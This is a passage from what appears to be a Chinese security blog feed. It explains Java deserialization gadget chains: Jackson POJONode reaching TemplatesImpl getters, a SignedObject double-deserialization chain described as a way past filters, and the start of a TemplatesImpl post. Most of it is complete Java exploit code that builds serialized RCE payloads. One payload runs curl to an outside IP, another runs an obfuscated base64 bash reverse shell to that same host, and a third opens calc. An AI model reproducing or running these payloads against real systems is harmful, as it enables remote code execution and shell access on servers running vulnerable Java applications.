class="hljs-symbol">:serialize-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeValue-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_serialize-&gt;SerializableSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serialize-&gt;POJONode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serialize-&gt;SerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defaultSerializeValue-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serialize-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeFields-&gt;BeanPropertyWriter</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeAsField</span><br></code></pre></td></tr></table></figure><p>到这里可以任意调用TemplatesImpl的任意getter，接着</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getOutputProperties-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:newTransformer-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance</span><br></code></pre></td></tr></table></figure><p>然后执行到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">AbstractTranslet translet <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><img src="/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/4.jpg" class=""><p>在newInstance()会类加载TemplatesImpl的<code>_bytecodes</code>的恶意字节（具体原因暂时不知道为什么）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctcconstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;,ctClass);<br>        ctcconstructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;curl http://8.138.10.69:9090\&quot;);&quot;</span>);<br>        ctClass.addConstructor(ctcconstructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>        <br>        <br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <br>        <br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxy);<br>        <br>        <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(exp,<span class="hljs-string">&quot;val&quot;</span>, jsonNodes);<br>        <br>        <br>        System.out.println(serial(exp));<br>        deserial(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="signobject链"><a class="markdownIt-Anchor" href="#signobject链"></a> SignObject链</h4><p>这是TemplatesImpl链的二次反序列化，可以用于绕过一些过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctcconstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;,ctClass);<br>        ctcconstructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMC42OS85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(ctcconstructor);<br>        ctClass.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>        <br>        <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <br>        <br>        <span class="hljs-comment">//使用AOP代理提高触发稳定性：https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DUhrKqit3o4rZYoD#toc-4</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <br>        <br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxy);<br>        <br>        <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(exp2,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes1);<br>        <br>        <br>        KeyPairGenerator keyPairGenerator= KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(exp2,privateKey,signingEngine);<br>        <br>        <br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <br>        <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);<br>        <br>        <br>        System.out.println(serial(exp));<br><span class="hljs-comment">//        deserial(serial(exp));</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/uuzeray/article/details/136889141">【Web】浅聊Jackson序列化getter的利用——POJONode-CSDN博客</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">Jackson的原生反序列化利用 | Java (gitbook.io)</a></p><p><a href="https://www.cnblogs.com/seizer/p/17064102.html">TemplatesImpl利用链分析 - seizer-zyx - 博客园 (cnblogs.com)</a></p><h3 id="高版本"><a class="markdownIt-Anchor" href="#高版本"></a> 高版本</h3>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl利用链详解</title>
    <link href="/2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p><code>TemplatesImep</code>利用链的核心就是可以恶意加载字节码，因为该类中存在一个内部类<code>TransletClassLoader</code>，该类继承了<code>ClassLoader</code>并且重写了<code>loadClass</code>，我们可以通过这个类加载器进行加载字节码,然后初始化执行恶意代码。</p><p>TemplatesImep利用链其实就是CC3的一些扩展。</p><h3 id="链子1"><a class="markdownIt-Anchor" href="#链子1"></a> 链子1</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplateImplTest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplateImplTest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateImplTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault(); <span class="hljs-comment">//创建ClassPool</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;TemplateImplTest&quot;</span>); <span class="hljs-comment">//创建一个新类</span><br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class)); <span class="hljs-comment">//添加一个类路径</span><br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">//将生成的类设置为 AbstractTranslet 的子类。</span><br>        CtConstructor ctConstructor=cc.makeClassInitializer(); <span class="hljs-comment">//创建类初始化器</span><br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="hljs-comment">//插入代码</span><br>        cc.writeFile(); <span class="hljs-comment">//写入文件</span><br><br>        <span class="hljs-type">byte</span>[] code=Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\CTFtmp\\demo\\TemplateImplTest.class&quot;</span>));<span class="hljs-comment">//从文件读取</span><br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Method defineTransletClasses=templates.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getTransletInstance&quot;</span>);<br>        defineTransletClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        defineTransletClasses.invoke(templates);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String field,Object arg )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Field f= obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj,arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span 